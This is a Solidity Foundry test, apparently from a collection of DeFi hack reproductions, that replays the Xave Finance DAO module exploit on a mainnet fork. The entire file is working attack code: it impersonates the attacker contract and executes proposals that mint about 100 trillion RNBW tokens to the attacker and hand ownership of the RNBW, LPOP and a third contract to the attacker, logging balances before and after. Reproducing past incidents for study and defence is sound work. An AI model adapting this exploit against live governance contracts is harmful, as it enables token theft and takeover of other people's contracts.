// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract Enum {
    enum Operation {
        Call, DelegateCall
    }
}

interface IDaoModule {
    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce) external view returns(bytes32); 

    function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) external;

    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
}

contract XaveFinanceExploit is DSTest {
    
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    IERC20 RNBW = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
    IERC20 LPOP = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
    IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);

    address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
    address attackerContract = 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;

    function setUp() public {
        cheats.createSelectFork("mainnet", 15704745); // fork mainnet at 15704745 
    }

    function testAttack() public {
        
        //tx to mint 100000000000000 $RNBW tokens
        bytes32 tx0 = daoModule.getTransactionHash(
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
            Enum.Operation(0),
            0
        );
        
        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx1 = daoModule.getTransactionHash(
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            1
        );

        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx2 = daoModule.getTransactionHash(
            0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,
            0,
            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            2
        );

        //will try to use abi.decode() to find out
        bytes32 tx3 = daoModule.getTransactionHash(
            0x579270F151D142eb8BdC081043a983307Aa15786,
            0,
            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            3
        );
        
        //the txIDs generated using getTransactionHash
        bytes32[] memory txIDs = new bytes32[](4);  
        txIDs[0] = 0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a;
        txIDs[1] = 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca;
        txIDs[2] = 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d;
        txIDs[3] = 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293;
        
        emit log_named_address("[Before proposal Execution] Owner of $RNBW: ", RNBW.owner());
        emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP.owner());
        emit log_named_uint("[Before proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);

        cheats.startPrank(attackerContract);

        //Execute mint 100000000000000 $RNBW tokens
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
            Enum.Operation(0),
            0
        );

        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            1
        );

        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,
            0,
            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            2
        );

        //need to research
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0x579270F151D142eb8BdC081043a983307Aa15786,
            0,
            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            3
        );

        cheats.stopPrank();

        emit log_string("--------------------------------------------------------------");
        emit log_named_address("[After proposal Execution] Owner of $RNBW: ", RNBW.owner());
        emit log_named_address("[After proposal Execution] Owner of $LPOP: ", LPOP.owner());
        emit log_named_uint("[After proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);
    }
}